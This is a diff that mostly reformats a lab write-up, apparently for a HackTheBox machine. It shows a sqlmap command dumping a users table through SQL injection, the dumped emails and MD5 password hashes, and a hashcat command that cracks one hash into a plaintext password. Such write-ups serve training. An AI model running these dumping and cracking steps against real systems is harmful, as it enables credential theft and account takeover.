@@ -53,10 +53,10 @@ drwxrwxr-x 2 kali kali 4096 Feb 22 04:32 winners
 ## 3. find some vuln code
 ```php
 
-#====================================#
+#=====================================================#
 #       The upload part and prepare statement are     #  
-#            fine but it use the username directly            #  
-#====================================#
+#         fine but it use the username directly       #  
+#=====================================================#
 
 # ===== contest.php =====
 
@@ -258,21 +258,24 @@ Serving HTTP on 0.0.0.0 port 443 (http://0.0.0.0:443/) ...
 ┌──(kali㉿kali)-[~/Desktop/htb]
 └─$ sqlmap -r req.txt --dbms=sqlite --level=5 --threads=10 -T users --dump
 
-+---------+-------------------------------+----------------------------------+
-| user_id | email                         | password                         | username               |
-+---------+-------------------------------+----------------------------------+
-| 1       | axel2017@gmail.com            | d1bbba3670feb9435c9841e46e60ee2f | axel                |
-| 5       | rosamendoza485@gmail.com      | ac369922d560f17d6eeb8b2c7dec498c | rosa      |
-| 3       | robertcervantes2000@gmail.com | 42846631708f69c00ec0c0a8aa4a92ad | robert  |
-| 4       | fabiancarachure2323@gmail.com | 39e153e825c4a3d314a0dc7f7475ddbe | fabian  |
-| 5       | jerrysonC343@gmail.com        | 781593e060f8d065cd7281c5ec5b4b86 | jerryson    |
-| 6       | larryP5656@gmail.com          | 1b6dce240bbfbc0905a664ad199e18f8 | larry   |
-| 7       | royer.royer2323@gmail.com     | c598f6b844a36fa7836fba0835f1f6   | royer   |
-| 8       | peterCC456@gmail.com          | e41ccefa439fc454f7eadbf1f139ed8a | peter   |
-| 9       | angel234g@gmail.com           | 24a8ec003ac2e1b3c5953a6f95f8f565 | angel |
-| 10      | jobert2020@gmail.com          | 88e4dceccd48820cf77b5cf6c08698ad | jobert  
++---------+-------------------------------+----------------------------------+------------+
+| user_id | email                         | password                         | username   |
++---------+-------------------------------+----------------------------------+ -----------+
+| 1       | axel2017@gmail.com            | d1bbba3670feb9435c9841e46e60ee2f | axel       |
+| 5       | rosamendoza485@gmail.com      | ac369922d560f17d6eeb8b2c7dec498c | rosa       |
+| 3       | robertcervantes2000@gmail.com | 42846631708f69c00ec0c0a8aa4a92ad | robert     |
+| 4       | fabiancarachure2323@gmail.com | 39e153e825c4a3d314a0dc7f7475ddbe | fabian     |
+| 5       | jerrysonC343@gmail.com        | 781593e060f8d065cd7281c5ec5b4b86 | jerryson   |
+| 6       | larryP5656@gmail.com          | 1b6dce240bbfbc0905a664ad199e18f8 | larry      |
+| 7       | royer.royer2323@gmail.com     | c598f6b844a36fa7836fba0835f1f6   | royer      |
+| 8       | peterCC456@gmail.com          | e41ccefa439fc454f7eadbf1f139ed8a | peter      |
+| 9       | angel234g@gmail.com           | 24a8ec003ac2e1b3c5953a6f95f8f565 | angel      | 
+| 10      | jobert2020@gmail.com          | 88e4dceccd48820cf77b5cf6c08698ad | jobert     |
 
 // password cracked
+┌──(kali㉿kali)-[~/Desktop/htb]
+└─$ hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt --username
+
 ac369922d560f17d6eeb8b2c7dec498c:soyunaprincesarosa 
 ```
 
@@ -464,7 +467,7 @@ chart.min.js 	Upload files to "/" 	2024-09-28 01:38:13 +00:00
 dashboard.php 	Upload files to "/" 	2024-09-28 01:38:13 +00:00
 index.php 	Upload files to "/" 	2024-09-28 01:38:13 +00:00
 logout.php 	Upload files to "/" 	2024-09-28 01:38:13 +00:00
-README.md 	Add README.md 	2024-09-28 04:04:08 +00:00
+README.md 	Add README.md 		2024-09-28 04:04:08 +00:00
 style.css 	Upload files to "/" 	2024-09-28 01:38:13 +00:00
 
 // check each of them and find this in index.php
